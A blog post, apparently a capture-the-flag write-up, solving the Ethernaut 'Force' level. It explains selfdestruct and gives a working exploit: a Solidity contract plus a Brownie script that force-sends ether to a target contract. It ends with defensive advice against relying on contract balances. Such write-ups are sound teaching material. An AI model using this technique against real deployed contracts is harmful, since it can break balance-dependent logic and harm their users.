---
title: Ethernaut - Level 07 - Force
date: 2022-10-26
---
{{<figure src="../images/force-7.png" caption="Image courtesy of OpenZeppelin">}}
## Ethernaut 07 - Force
This level from  Ethernaut, Force, provides us with an empty smart contract containing only some ASCII-art. The goal here is to send some ether to the contract using  the `selfdestruct()` instruction.

```solidity
# Level 07 - Force

### Source Code

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\\_/\\   /
    ____/ o o \\
  /~____  =ø= /
 (______)__m_m)

*/}
```

Before explaining why this smart contract is vulnerable, let's get familiarized with the function `selfdestruct()`. This low-level opcode call lets you delete a contract from the blockchain, sending all remaining ethers stored in the contract to a designated address.

Developers typically include a `selfdestruct` instruction when one of the following scenarios is present:

- **Deprecate contracts with known vulnerabilities**: Smart contracts may contain security issues or undesired behaviors that may go unnoticed at first. Developers can destroy a contract using `selfdestruct` and send forward the remaining ethers to a backup address.
- **Clean up obsolete contracts**: Mostly used as a best practice to free up storage on the Ethereum blockchain.
- **Upgrade smart contracts**: For example, the ERC-20 framework is the standard implementation for all fungible tokens on Ethereum.  Any token that does not interface with the ERC-20 standard will have difficulty interacting with other contracts.
  
  In these cases,  developers will change to a new contract instead of upgrading the current contract, using the `selfdestruct` function to extract funds from the current contract and build a new contract with the required functionalities.

For instance, using the `selfdestruct` function in the DAO attack could have resulted in a faster resolution, minimal loss of funds, and immediate protection against further exploits.

### Where is the vulnerability?

The first thing we may notice when inspecting this contract is the lack of `payable` and `callback` functions to receive ethers. As explained earlier in this post, we will only be able to hack this contract if we figure out a way to make the contract’s balance greater than 0.

This contract is all about using `selfdestruct`, which according to Solidity documentation:

> The only way to remove code from the blockchain is when a contract at that address performs the `selfdestruct` operation. The remaining ether stored at that address is sent to a designated target and then the storage and code is removed from the state.

The idea for this challenge is to create a contract with some ether and then use `selfdestruct` to destroy the current contract, this will force the contract to send its funds to the Force contract’s address.

### Hacking the contract

Our exploit will be composed by a malicious contract which declares a `public` function that executes the `selfdestruct` method and receives as parameter the address of the contract where the funds will be transferred, as shown below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceExploit {
    receive() external payable {}

    function destroy(address payable _address) public {
        selfdestruct(_address);
    }
}
```

The next piece in our attack vector will be a script that deploys this new contract, send some funds to it, and then calls the `destroy` function, providing as argument to the `_address` variable, the address assigned to the `Force` contract:

```solidity
from brownie import accounts, config, ForceExploit

def attack(exploit_contract, hacker, target):
    # First we do a transaction to our newly deployed contract
    print("Transfer to exploit contract")
    # Submit a transfer to our exploit contract
    hacker.transfer(to=exploit_contract.address, amount="0.00001 ether")
    # Destroy the contract using selfdestruct and sending the remaining funds to the given address
    exploit_contract.destroy(target, {'from': hacker})

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    exploit_contract = ForceExploit.deploy({'from': hacker})

    attack(exploit_contract, hacker, target)
```

Executing the above script will trigger a transfer of funds from our malicious contract to the victim’s contract, successfully passing this level.

### Takeaways

This type of security vulnerabilities arises from the misuse of the `this.balance` statemeent. Contracts that depend on specific balances on their logic are prone to unexpected behavior as balances can be altered through malicious contracts that use `selfdestruct()`.

Instead, if exact values of deposited ether are required, it is recommendable to create a private variable used to safely track the deposited ether. This will avoid the contract from being susceptible to forced ether sent via a `selfdestruct()` call.

Additionally, remember that even if you have not implemented a `selfdestruct()` call, it is still possible to call it through any `delegatecall()` vulnerabilities.